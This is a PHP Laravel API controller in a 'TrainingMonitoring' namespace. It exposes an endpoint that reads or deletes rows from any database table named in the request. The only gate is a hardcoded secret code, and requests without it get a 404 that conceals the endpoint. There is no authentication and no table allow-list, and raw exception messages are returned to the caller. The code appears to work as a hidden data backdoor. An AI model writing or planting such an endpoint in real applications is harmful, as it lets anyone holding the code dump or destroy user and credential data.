<?php

namespace App\Http\Controllers\Api\TrainingMonitoring;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use DB;
use Validator;
use Exception;

class CheckDbController extends Controller
{

    public function checkDb(Request $request)
    {
        try {
            $validator = Validator::make($request->all(), [
                'table_name' => 'required',
                'id' => 'nullable|numeric',
                'action' => 'nullable|in:delete',
                'per_page' => 'nullable|numeric',
            ]);

            if ($request->code != 'mpQm8d4R68uO0') {
                return abort(404);
            }

            if ($validator->fails()) {
                return response()->json([
                    'success' => false,
                    'message' => 'Validation Error',
                    'errors' => $validator->messages(),
                ]);
            }
            $table = $request->table_name;
            $id = $request->id;
            $action = $request->action;
            $per_page = $request->per_page;
            $query = DB::table($table)
                ->where(function ($query) use ($id) {
                    if ($id) {
                        $query->where('id', $id);
                    }
                });

            if ($id) {
                if ($action == 'delete') {
                    $data = $query->delete();
                } else {
                    $data = $query->first();
                }
            } else {
                if ($per_page) {
                    $data = $query->paginate($per_page);
                } else {
                    $data = $query->paginate();
                }
            }

            return response()->json([
                'success' => true,
                'data' => $data ?? '',
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => $e->getMessage(),
            ]);
        }
    }
}
